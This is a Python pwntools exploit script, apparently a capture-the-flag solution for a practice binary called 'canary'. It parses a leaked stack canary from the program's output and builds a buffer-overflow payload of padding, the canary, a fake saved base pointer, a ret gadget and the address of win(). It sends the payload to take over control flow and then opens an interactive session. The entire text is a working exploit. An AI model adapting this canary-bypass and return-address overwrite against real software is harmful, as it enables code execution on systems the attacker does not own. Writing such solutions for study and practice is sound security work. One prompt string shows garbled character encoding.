#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./canary", checksec=False)
io = elf.process()

# Step 1: Get the canary leak from program output
io.recvuntil("Hereâ€™s your lucky number: ")
canary = int(io.recvline().strip(), 16)
log.success(f"Leaked canary: {hex(canary)}")

# Step 2: Build the ROP payload
padding = 72
saved_rbp = b"B" * 8
ret = 0x000000000040101a
win = elf.sym.win

payload = flat(
    b"A" * padding,
    canary,
    saved_rbp,
    ret,    # stack alignment if needed
    win
)

# Step 3: Send payload to overflow and call win()
io.sendlineafter("Enter something: ", payload)
io.interactive()

